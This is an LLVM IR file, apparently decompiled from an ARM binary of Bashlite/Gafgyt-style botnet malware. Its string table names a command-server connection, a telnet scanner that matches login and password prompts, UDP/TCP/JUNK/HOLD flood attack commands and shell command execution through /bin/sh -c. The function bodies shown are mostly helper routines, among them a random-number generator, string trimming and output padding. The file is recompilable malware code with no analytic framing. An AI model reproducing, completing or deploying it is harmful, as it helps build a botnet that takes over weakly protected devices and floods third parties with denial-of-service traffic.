source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_f640.3 = constant i32 -509558771
@global_var_199e4.6 = constant [6 x i8] c"ARM-4\00"
@global_var_8234.7 = constant i32 -476053420
@global_var_19a28.17 = constant [8 x i8] c"UNKNOWN\00"
@global_var_23718.19 = global i32 0
@global_var_2371c.20 = local_unnamed_addr global i32 0
@global_var_23720.21 = local_unnamed_addr global i32 0
@global_var_19a30.27 = constant [7 x i8] c"(null)\00"
@global_var_27718.29 = local_unnamed_addr global i32 0
@global_var_19a38.31 = constant [8 x i8] c"/bin/sh\00"
@global_var_19a40.33 = constant [3 x i8] c"sh\00"
@global_var_19a44.35 = constant [3 x i8] c"-c\00"
@global_var_19a48.38 = constant i32 -1
@global_var_19e48.40 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_19e58.42 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_23700.47 = global i32 0
@global_var_19e64.49 = constant [5 x i8] c"PING\00"
@global_var_23708.51 = global i32 0
@global_var_2370c.52 = local_unnamed_addr global i32 0
@global_var_29778.54 = global i32 0
@global_var_19e6c.56 = constant [6 x i8] c":>%$#\00"
@global_var_19e74.60 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_29770.62 = global i32 0
@global_var_19e80.64 = constant [6 x i8] c"ogin:\00"
@global_var_19e88.67 = constant [3 x i8] c"\0D\0A\00"
@global_var_19e8c.69 = constant [9 x i8] c"assword:\00"
@global_var_19e98.71 = constant [9 x i8] c"ncorrect\00"
@global_var_19ea4.78 = constant [4 x i8] c"all\00"
@global_var_19ea8.80 = constant i32 44
@global_var_19eac.82 = constant [4 x i8] c"syn\00"
@global_var_19eb0.84 = constant [4 x i8] c"rst\00"
@global_var_19eb4.86 = constant [4 x i8] c"fin\00"
@global_var_19eb8.88 = constant [4 x i8] c"ack\00"
@global_var_19ebc.90 = constant [4 x i8] c"psh\00"
@global_var_19ec0.93 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_19ed4.97 = constant [6 x i8] c"PONG!\00"
@global_var_19edc.99 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_19ee8.102 = constant [10 x i8] c"My IP: %s\00"
@global_var_19ef4.104 = constant [5 x i8] c"HOLD\00"
@global_var_19efc.107 = constant [5 x i8] c"JUNK\00"
@global_var_19f04.109 = constant [4 x i8] c"UDP\00"
@global_var_19f08.111 = constant [4 x i8] c"TCP\00"
@global_var_19f0c.113 = constant [9 x i8] c"KILLATTK\00"
@global_var_19f18.117 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_19f24.122 = constant [8 x i8] c"8.8.8.8\00"
@global_var_19f2c.125 = constant [16 x i8] c"/proc/net/route\00"
@global_var_19f3c.127 = constant [11 x i8] c"\0900000000\09\00"
@global_var_23710.129 = global i32 0
@global_var_19f48.131 = constant [6 x i8] c"-bash\00"
@global_var_19f88.133 = constant i32 1831885595
@global_var_19f50.135 = constant [46 x i8] c"%sWelcome to the botnet [%s:%s:%d cores] :)%s\00"
@global_var_19f80.137 = constant i32 859003675
@global_var_19f90.139 = constant i32 47
@global_var_19f94.141 = constant [38 x i8] c"%sCould not connect to commServer!%s\0A\00"
@global_var_19fbc.144 = constant [17 x i8] c"BUILD [%s:%s:%d]\00"
@global_var_19fd0.148 = constant [8 x i8] c"SCANNER\00"
@global_var_19fd8.150 = constant [17 x i8] c"SCANNER ON | OFF\00"
@global_var_19fec.152 = constant [4 x i8] c"OFF\00"
@global_var_29774.154 = global i32 0
@global_var_19ff0.156 = constant [17 x i8] c"SCANNER STOPPED!\00"
@global_var_1a004.158 = constant [3 x i8] c"ON\00"
@global_var_1a008.160 = constant [28 x i8] c"attempting to start scanner\00"
@global_var_1a024.162 = constant [17 x i8] c"SCANNER STARTED!\00"
@global_var_1a038.165 = constant [5 x i8] c"PONG\00"
@global_var_1a040.167 = constant [4 x i8] c"DUP\00"
@global_var_1a044.169 = constant [3 x i8] c"SH\00"
@global_var_1a048.171 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant i32 114
@global_var_1a054.175 = constant [3 x i8] c"%s\00"
@global_var_1a058.177 = constant i32 32
@global_var_29764.184 = global i32 0
@global_var_1a65c.197 = constant i32 0
@global_var_15dc4.198 = constant i32 -382909968
@global_var_16180.204 = constant i32 -382910224
@global_var_1a684.207 = constant i32 2949163
@global_var_1a67c.209 = constant [7 x i8] c"(null)\00"
@global_var_297a4.211 = global i32 0
@global_var_1a690.215 = constant i32 135270416
@global_var_1a6d6.220 = constant i32 327688
@global_var_1a6ee.221 = constant i32 16843008
@global_var_1a714.226 = constant [8 x i8] c" +0-#'I\00"
@global_var_1a698.230 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1a6fc.232 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1a6cc.234 = constant i32 252117248
@global_var_1a6cb.235 = constant i32 117506048
@global_var_1a6bc.237 = constant i32 331776
@global_var_1a6ac.239 = constant i32 335616
@global_var_2977c.242 = global i32 0
@global_var_11fac.243 = constant i32 -456978431
@global_var_1a72c.252 = constant [8 x i8] c"Success\00"
@global_var_297cc.268 = global i32 0
@global_var_12b5c.274 = constant i32 -478871519
@global_var_134d0.283 = constant i32 -382906384
@global_var_29748.291 = local_unnamed_addr global i32 0
@global_var_1086c.293 = constant i32 -509591552
@global_var_13a90.299 = constant i32 -442564540
@global_var_1b288.325 = constant i32 0
@global_var_2974c.340 = local_unnamed_addr global i32 0
@global_var_10b40.343 = constant i32 -382909968
@global_var_14338.344 = constant i32 -494075872
@global_var_10898.345 = constant i32 -382910336
@global_var_1b2b0.349 = constant [11 x i8] c"/proc/stat\00"
@global_var_1b2bc.352 = constant i32 32
@global_var_1b2c0.355 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1b2d0.357 = constant [10 x i8] c"processor\00"
@global_var_1b2f4.359 = constant i32 604672
@global_var_144f8.362 = constant i32 -369098421
@global_var_2975c.377 = local_unnamed_addr global i32 0
@global_var_29760.379 = local_unnamed_addr global i32 0
@global_var_1b2f8.382 = constant [10 x i8] c"/dev/null\00"
@global_var_13900.383 = constant i32 -442543860
@global_var_10aa4.388 = constant i32 -382910352
@global_var_12050.393 = constant i32 -369093366
@global_var_2976c.414 = local_unnamed_addr global i32 0
@global_var_153bc.420 = constant i32 -443088884
@global_var_13684.435 = constant i32 -382909968
@global_var_1b2d8.438 = constant i32 114
@global_var_1709c.443 = constant i32 -382906384
@global_var_16120.461 = constant i32 -509607926
@global_var_cdd0.463 = constant i32 436207629
@global_var_1b320.467 = constant [4 x i8] c"inf\00"
@global_var_1b338.470 = constant i32 0
@global_var_1b323.473 = constant i32 1179535616
@global_var_1b330.474 = constant i32 2883630
@global_var_16ec0.484 = constant i32 -509607928
@global_var_180ec.529 = constant i32 -478805983
@global_var_19058.542 = constant i32 -504313148
@global_var_19040.543 = constant i32 -483131392
@global_var_18eec.544 = constant i32 -481229311
@global_var_190c8.545 = constant i32 -477817729
@global_var_19404.546 = constant i32 -516685812
@global_var_192f8.547 = constant i32 -905969571
@global_var_1922c.548 = constant i32 -528203771
@global_var_1948c.549 = constant i32 -478079873
@global_var_19470.550 = constant i32 -534704125
@global_var_19420.551 = constant i32 -534704125
@global_var_193b8.552 = constant i32 -483131392
@global_var_29738.257 = global i64* null
@global_var_14f70.406 = constant i16 -851
@global_var_1a050.173 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80b4() local_unnamed_addr {
entry:
  %v3_80b8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80b8)
  %v31_80c0 = load i32, i32* @r0, align 4
  ret i32 %v31_80c0
}

define i32 @function_80d0(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_80d0 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_80d0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_80d0 = load i32, i32* @r4, align 4
  %v2_80d0 = trunc i32 %v1_80d0 to i8
  store i8 %v2_80d0, i8* %arg1, align 1
  %v0_80d4.pr = load i1, i1* @cpsr_n, align 1
  br i1 %v0_80d4.pr, label %bb1, label %.thread

bb1:                                              ; preds = %bb
  %v1_80d4 = load i32, i32* @r4, align 4
  %v2_80d4 = trunc i32 %v1_80d4 to i8
  store i8 %v2_80d4, i8* %arg1, align 1
  br label %.thread

.thread:                                          ; preds = %entry, %bb, %bb1
  ret i32 %tmp

; uselistorder directives
  uselistorder label %.thread, { 2, 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_81b8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81d8 = call i32 @function_14ce0(i32 ptrtoint (i32* @global_var_f640.3 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32948, i32 104508, i32 %arg1, i32 %v4_81b8)
  %v0_81dc = call i32 @function_13900()
  ret i32 %v0_81dc
}

define i32 @function_8204(i32 %arg1) local_unnamed_addr {
dec_label_pc_8204:
  ret i32 ptrtoint ([6 x i8]* @global_var_199e4.6 to i32)
}

define i32 @function_8228() local_unnamed_addr {
dec_label_pc_8228:
  %stack_var_0 = alloca i32, align 4
  %v1_8228 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8228, i32* @ip, align 4
  %v3_822c = load i32, i32* @fp, align 4
  %v1_8238 = call i32 @function_144dc(i32 84)
  store i32 %v3_822c, i32* @fp, align 4
  ret i32 %v1_8238
}

define i32 @function_8250() local_unnamed_addr {
dec_label_pc_8338:
  ret i32 ptrtoint ([8 x i8]* @global_var_19a28.17 to i32)
}

define i32 @function_8368(i32 %arg1) local_unnamed_addr {
dec_label_pc_8368:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_8378 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8378, i32* @global_var_23718.19, align 4
  %v1_8398 = add i32 %v0_8378, -1640531527
  store i32 %v1_8398, i32* @global_var_2371c.20, align 4
  %v1_83b4 = add i32 %v0_8378, 1013904242
  store i32 %v1_83b4, i32* @global_var_23720.21, align 4
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_8368, %dec_label_pc_83cc
  %storemerge12 = phi i32 [ 3, %dec_label_pc_8368 ], [ %v1_8410, %dec_label_pc_83cc ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_83dc = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_23718.19 to i32), i32 -12)
  %v6_83dc = inttoptr i32 %v5_83dc to i32*
  %v7_83dc = load i32, i32* %v6_83dc, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_83ec = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_23718.19 to i32), i32 -8)
  %v6_83ec = inttoptr i32 %v5_83ec to i32*
  %v7_83ec = load i32, i32* %v6_83ec, align 4
  %v2_83f0 = xor i32 %storemerge12, -1640531527
  %v2_83f8 = xor i32 %v2_83f0, %v7_83dc
  %v2_8400 = xor i32 %v2_83f8, %v7_83ec
  %v5_8408 = mul nuw nsw i32 %storemerge12, 4
  %v6_8408 = add i32 %v5_8408, ptrtoint (i32* @global_var_23718.19 to i32)
  %v7_8408 = inttoptr i32 %v6_8408 to i32*
  store i32 %v2_8400, i32* %v7_8408, align 4
  %v1_8410 = add nuw nsw i32 %storemerge12, 1
  %v7_8428 = icmp slt i32 %v1_8410, 4096
  br i1 %v7_8428, label %dec_label_pc_83cc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_83cc
  %v1_8434 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8434

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_83cc, { 1, 0 }
}

define i32 @function_8440() local_unnamed_addr {
dec_label_pc_8440:
  %v2_8470 = load i32, i32* inttoptr (i32 144520 to i32*), align 8
  %v1_8474 = add i32 %v2_8470, 1
  %v3_847c = urem i32 %v1_8474, 4096
  store i32 %v3_847c, i32* inttoptr (i32 144520 to i32*), align 8
  %v4_8494 = mul nuw nsw i32 %v3_847c, 4
  %v5_8494 = add i32 %v4_8494, ptrtoint (i32* @global_var_23718.19 to i32)
  %v6_8494 = inttoptr i32 %v5_8494 to i32*
  %v7_8494 = load i32, i32* %v6_8494, align 4
  %v6_84b4 = udiv i32 %v7_8494, 228675
  store i32 %v6_84b4, i32* inttoptr (i32 144516 to i32*), align 4
  br i1 true, label %dec_label_pc_8544, label %dec_label_pc_8524

dec_label_pc_8524:                                ; preds = %dec_label_pc_8440
  br label %dec_label_pc_8544

dec_label_pc_8544:                                ; preds = %dec_label_pc_8440, %dec_label_pc_8524
  %v2_8548 = load i32, i32* inttoptr (i32 144520 to i32*), align 8
  %v4_8564 = mul i32 %v2_8548, 4
  %v5_8564 = add i32 %v4_8564, ptrtoint (i32* @global_var_23718.19 to i32)
  %v6_8564 = inttoptr i32 %v5_8564 to i32*
  %v7_8564 = load i32, i32* %v6_8564, align 4
  ret i32 %v7_8564

; uselistorder directives
  uselistorder i32* @global_var_23718.19, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23718.19 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_8544, { 1, 0 }
}

define i32 @function_8578(i32 %arg1) local_unnamed_addr {
dec_label_pc_8578:
  %v0_8578 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8578, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_8578
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_8578, %bb
  %v7_8580 = load i32, i32* @r0, align 4
  ret i32 %v7_8580

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_8584(i32 %arg1) local_unnamed_addr {
dec_label_pc_8584:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8584 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8584, i32* @ip, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_85a4 = call i32 @function_11fd0()
  store i32 %v0_85a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_8584
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_8584 ], [ %v1_85bc, %dec_label_pc_85c4 ]
  %v2_85d0 = add i32 %stack_var_-24.0, %arg1
  %v1_85d4 = inttoptr i32 %v2_85d0 to i8*
  %v2_85d4 = load i8, i8* %v1_85d4, align 1
  %v3_85d4 = zext i8 %v2_85d4 to i32
  store i32 %v3_85d4, i32* %r0.global-to-local, align 4
  %v1_85dc = call i32 @function_10904(i32 %v3_85d4)
  store i32 %v1_85dc, i32* %r0.global-to-local, align 4
  %v2_85e4 = icmp eq i32 %v1_85dc, 0
  %v1_85bc = add i32 %stack_var_-24.0, 1
  br i1 %v2_85e4, label %dec_label_pc_85fc.preheader, label %dec_label_pc_85c4

dec_label_pc_85fc.preheader:                      ; preds = %dec_label_pc_85c4
  %v1_85ac = add i32 %v0_85a4, -1
  %v5_860810 = icmp slt i32 %v1_85ac, %stack_var_-24.0
  br i1 %v5_860810, label %dec_label_pc_867c.preheader, label %dec_label_pc_860c

dec_label_pc_85f0:                                ; preds = %dec_label_pc_860c
  %v1_85f4 = add i32 %stack_var_-20.011, -1
  %v5_8608 = icmp slt i32 %v1_85f4, %stack_var_-24.0
  br i1 %v5_8608, label %dec_label_pc_867c.preheader, label %dec_label_pc_860c

dec_label_pc_860c:                                ; preds = %dec_label_pc_85fc.preheader, %dec_label_pc_85f0
  %stack_var_-20.011 = phi i32 [ %v1_85f4, %dec_label_pc_85f0 ], [ %v1_85ac, %dec_label_pc_85fc.preheader ]
  %v2_8618 = add i32 %stack_var_-20.011, %arg1
  %v1_861c = inttoptr i32 %v2_8618 to i8*
  %v2_861c = load i8, i8* %v1_861c, align 1
  %v3_861c = zext i8 %v2_861c to i32
  store i32 %v3_861c, i32* %r0.global-to-local, align 4
  %v1_8624 = call i32 @function_10904(i32 %v3_861c)
  store i32 %v1_8624, i32* %r0.global-to-local, align 4
  %v2_862c = icmp eq i32 %v1_8624, 0
  br i1 %v2_862c, label %dec_label_pc_867c.preheader, label %dec_label_pc_85f0

dec_label_pc_867c.preheader:                      ; preds = %dec_label_pc_85f0, %dec_label_pc_860c, %dec_label_pc_85fc.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_85ac, %dec_label_pc_85fc.preheader ], [ %v1_85f4, %dec_label_pc_85f0 ], [ %stack_var_-20.011, %dec_label_pc_860c ]
  br label %dec_label_pc_867c

dec_label_pc_8640:                                ; preds = %dec_label_pc_867c
  %v2_8664 = add i32 %storemerge1, %arg1
  %v1_8668 = inttoptr i32 %v2_8664 to i8*
  %v2_8668 = load i8, i8* %v1_8668, align 1
  %v3_866c = inttoptr i32 %v2_86a0 to i8*
  store i8 %v2_8668, i8* %v3_866c, align 1
  %v1_8674 = add i32 %storemerge1, 1
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.preheader, %dec_label_pc_8640
  %storemerge1 = phi i32 [ %v1_8674, %dec_label_pc_8640 ], [ %stack_var_-24.0, %dec_label_pc_867c.preheader ]
  %v7_8688 = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8694 = sub i32 %storemerge1, %stack_var_-24.0
  %v2_86a0 = add i32 %v2_8694, %arg1
  br i1 %v7_8688, label %dec_label_pc_868c, label %dec_label_pc_8640

dec_label_pc_868c:                                ; preds = %dec_label_pc_867c
  %v3_86a8 = inttoptr i32 %v2_86a0 to i8*
  store i8 0, i8* %v3_86a8, align 1
  %v1_86b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_86b4

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_85ac, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 3, 2, 6, 1, 0 }
  uselistorder i32 (i32)* @function_10904, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_867c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_860c, { 1, 0 }
}

define i32 @function_86b8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_86b8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_86b8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_86b8, i32* @ip, align 4
  %v0_86c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_86d4 = icmp eq i32 %v0_86c8, 0
  br i1 %v2_86d4, label %dec_label_pc_8708, label %dec_label_pc_86dc

dec_label_pc_86dc:                                ; preds = %dec_label_pc_86b8
  %v1_86e0 = inttoptr i32 %v0_86c8 to i32*
  %v2_86e0 = load i32, i32* %v1_86e0, align 4
  %v1_86ec = trunc i32 %arg2 to i8
  %v3_86ec = inttoptr i32 %v2_86e0 to i8*
  store i8 %v1_86ec, i8* %v3_86ec, align 1
  %v2_86f4 = load i32, i32* %v1_86e0, align 4
  %v1_86f8 = add i32 %v2_86f4, 1
  store i32 %v1_86f8, i32* %v1_86e0, align 4
  %v1_8724.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_871c

dec_label_pc_8708:                                ; preds = %dec_label_pc_86b8
  %v2_86c4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_8718 = call i32 @function_107b0(i32 1, i32 %v2_86c4)
  store i32 %v2_8718, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_871c

dec_label_pc_871c:                                ; preds = %dec_label_pc_86dc, %dec_label_pc_8708
  %v1_8724 = phi i32 [ %v1_8724.pre, %dec_label_pc_86dc ], [ %v2_8718, %dec_label_pc_8708 ]
  ret i32 %v1_8724

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_871c, { 1, 0 }
}

define i32 @function_8728(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8728:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8728 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8728, i32* @ip, align 4
  %v3_872c = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_87e4, label %dec_label_pc_8764

dec_label_pc_8764:                                ; preds = %dec_label_pc_8728
  %v2_879419 = load i8, i8* %arg2, align 1
  %v2_879821 = icmp eq i8 %v2_879419, 0
  br i1 %v2_879821, label %dec_label_pc_87a0, label %dec_label_pc_8778

dec_label_pc_8778:                                ; preds = %dec_label_pc_8764, %dec_label_pc_8778
  %v4_879023 = phi i32 [ %v1_8788, %dec_label_pc_8778 ], [ %tmp, %dec_label_pc_8764 ]
  %stack_var_-40.022 = phi i32 [ %v1_877c, %dec_label_pc_8778 ], [ 0, %dec_label_pc_8764 ]
  %v1_877c = add i32 %stack_var_-40.022, 1
  %v1_8788 = add i32 %v4_879023, 1
  %v5_878c = inttoptr i32 %v1_8788 to i8*
  %v2_8794 = load i8, i8* %v5_878c, align 1
  %v2_8798 = icmp eq i8 %v2_8794, 0
  br i1 %v2_8798, label %dec_label_pc_87a0, label %dec_label_pc_8778

dec_label_pc_87a0:                                ; preds = %dec_label_pc_8778, %dec_label_pc_8764
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_8764 ], [ %v1_877c, %dec_label_pc_8778 ]
  %v5_87ac = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_87ac, label %dec_label_pc_87bc, label %dec_label_pc_87cc

dec_label_pc_87bc:                                ; preds = %dec_label_pc_87a0
  %v2_87c4 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_87cc

dec_label_pc_87cc:                                ; preds = %dec_label_pc_87a0, %dec_label_pc_87bc
  %storemerge3 = phi i32 [ %v2_87c4, %dec_label_pc_87bc ], [ 0, %dec_label_pc_87a0 ]
  %v1_87d0 = and i32 %arg4, 2
  %v2_87d4 = icmp eq i32 %v1_87d0, 0
  br i1 %v2_87d4, label %dec_label_pc_87e4, label %dec_label_pc_87dc

dec_label_pc_87dc:                                ; preds = %dec_label_pc_87cc
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87cc, %dec_label_pc_8728, %dec_label_pc_87dc
  %stack_var_-28.0 = phi i32 [ %arg3, %dec_label_pc_8728 ], [ %storemerge3, %dec_label_pc_87cc ], [ %storemerge3, %dec_label_pc_87dc ]
  %stack_var_-44.0 = phi i32 [ 32, %dec_label_pc_8728 ], [ 32, %dec_label_pc_87cc ], [ 48, %dec_label_pc_87dc ]
  %v1_87e8 = urem i32 %arg4, 2
  %v2_87ec = icmp eq i32 %v1_87e8, 0
  br i1 %v2_87ec, label %dec_label_pc_881c.preheader, label %dec_label_pc_8858.preheader

dec_label_pc_881c.preheader:                      ; preds = %dec_label_pc_87e4
  %v5_882416 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_882416, label %dec_label_pc_87f8.lr.ph, label %dec_label_pc_8858.preheader

dec_label_pc_87f8.lr.ph:                          ; preds = %dec_label_pc_881c.preheader
  %v2_8800 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_87f8

dec_label_pc_87f8:                                ; preds = %dec_label_pc_87f8.lr.ph, %dec_label_pc_87f8
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_87f8.lr.ph ], [ %v1_8814, %dec_label_pc_87f8 ]
  %v3_8800 = call i32 @function_86b8(i32* %v2_8800, i32 %stack_var_-44.0)
  %v3_8804 = load i32, i32* %stack_var_-48, align 4
  %v1_8808 = add i32 %v3_8804, 1
  store i32 %v1_8808, i32* %stack_var_-48, align 4
  %v1_8814 = add nsw i32 %stack_var_-28.117, -1
  %v5_8824 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_8824, label %dec_label_pc_87f8, label %dec_label_pc_8858.preheader

dec_label_pc_8858.preheader:                      ; preds = %dec_label_pc_87f8, %dec_label_pc_881c.preheader, %dec_label_pc_87e4
  %v3_889c27 = phi i32 [ 0, %dec_label_pc_87e4 ], [ 0, %dec_label_pc_881c.preheader ], [ %v1_8808, %dec_label_pc_87f8 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_87e4 ], [ %stack_var_-28.0, %dec_label_pc_881c.preheader ], [ 0, %dec_label_pc_87f8 ]
  %v2_885c9 = load i8, i8* %arg2, align 1
  %v2_886011 = icmp eq i8 %v2_885c9, 0
  br i1 %v2_886011, label %dec_label_pc_8890.preheader, label %dec_label_pc_882c.lr.ph

dec_label_pc_882c.lr.ph:                          ; preds = %dec_label_pc_8858.preheader
  %v2_883c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_882c

dec_label_pc_882c:                                ; preds = %dec_label_pc_882c.lr.ph, %dec_label_pc_882c
  %v4_885813 = phi i32 [ %tmp, %dec_label_pc_882c.lr.ph ], [ %v1_8850, %dec_label_pc_882c ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_882c.lr.ph ], [ %v5_8854, %dec_label_pc_882c ]
  %v2_8830 = load i8, i8* %stack_var_-24.012, align 1
  %v3_8830 = zext i8 %v2_8830 to i32
  %v3_883c = call i32 @function_86b8(i32* %v2_883c, i32 %v3_8830)
  %v3_8840 = load i32, i32* %stack_var_-48, align 4
  %v1_8844 = add i32 %v3_8840, 1
  store i32 %v1_8844, i32* %stack_var_-48, align 4
  %v1_8850 = add i32 %v4_885813, 1
  %v5_8854 = inttoptr i32 %v1_8850 to i8*
  %v2_885c = load i8, i8* %v5_8854, align 1
  %v2_8860 = icmp eq i8 %v2_885c, 0
  br i1 %v2_8860, label %dec_label_pc_8890.preheader, label %dec_label_pc_882c

dec_label_pc_8890.preheader:                      ; preds = %dec_label_pc_882c, %dec_label_pc_8858.preheader
  %v3_889c26 = phi i32 [ %v3_889c27, %dec_label_pc_8858.preheader ], [ %v1_8844, %dec_label_pc_882c ]
  %v5_88986 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_88986, label %dec_label_pc_886c.lr.ph, label %dec_label_pc_889c

dec_label_pc_886c.lr.ph:                          ; preds = %dec_label_pc_8890.preheader
  %v2_8874 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_886c.lr.ph, %dec_label_pc_886c
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_886c.lr.ph ], [ %v1_8888, %dec_label_pc_886c ]
  %v3_8874 = call i32 @function_86b8(i32* %v2_8874, i32 %stack_var_-44.0)
  %v3_8878 = load i32, i32* %stack_var_-48, align 4
  %v1_887c = add i32 %v3_8878, 1
  store i32 %v1_887c, i32* %stack_var_-48, align 4
  %v1_8888 = add nsw i32 %stack_var_-28.37, -1
  %v5_8898 = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_8898, label %dec_label_pc_886c, label %dec_label_pc_889c

dec_label_pc_889c:                                ; preds = %dec_label_pc_886c, %dec_label_pc_8890.preheader
  %v3_889c = phi i32 [ %v3_889c26, %dec_label_pc_8890.preheader ], [ %v1_887c, %dec_label_pc_886c ]
  store i32 %v3_872c, i32* @fp, align 4
  ret i32 %v3_889c

; uselistorder directives
  uselistorder i32 %v1_8850, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8788, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_886c, { 1, 0 }
  uselistorder label %dec_label_pc_882c, { 1, 0 }
